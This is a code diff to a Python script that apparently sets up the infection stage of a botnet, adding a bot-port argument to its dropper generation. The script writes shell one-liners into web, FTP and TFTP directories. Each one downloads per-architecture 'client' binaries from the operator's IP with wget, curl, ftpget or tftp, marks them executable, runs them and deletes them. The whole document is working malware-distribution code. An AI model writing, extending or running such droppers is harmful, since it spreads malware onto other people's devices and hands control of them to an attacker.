@@ -3,13 +3,14 @@ import sys
 import os
 
 # Check if the IP address and Rust project directory are provided
-if len(sys.argv) < 3:
+if len(sys.argv) < 4:
     print("\x1b[0;31mIncorrect Usage!")
-    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <RUST_PROJECT_DIRECTORY> <IPADDR> \x1b[0m")
+    print("\x1b[0;32mUsage: python " + sys.argv[0] + " <RUST_PROJECT_DIRECTORY> <IP_ADDR> <BOT_PORT> \x1b[0m")
     sys.exit(1)
 
 rust_project = sys.argv[1]
 ip = sys.argv[2]
+bot_port = sys.argv[3]
 def run(cmd):
     subprocess.call(cmd, shell=True)
 
@@ -126,11 +127,11 @@ run('echo "#!/bin/bash" > /var/www/html/bins.sh')
 
 for arch in rust_archs:
     i = "client-" + arch
-    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
-    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/' + i + '; curl -O http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + ' ' + ip + ' ' + bot_port + '; rm -rf ' + i + '" >> /var/www/html/bins.sh')
+    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' ' + i + ' ' + i + '; chmod 777 ' + i + ' ./' + i + ' ' + ip + ' ' + bot_port + '; rm -rf ' + i + '" >> /var/ftp/ftp1.sh')
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get ' + i + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp1.sh')
     run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' + i + ' -g ' + ip + ';cat ' + i + ' >badbox;chmod +x *;./badbox" >> /var/lib/tftpboot/tftp2.sh')
-
+# TODO: update badbox to support ip:port args
 run("chmod 777 /var/www/html/bins.sh")
 
 
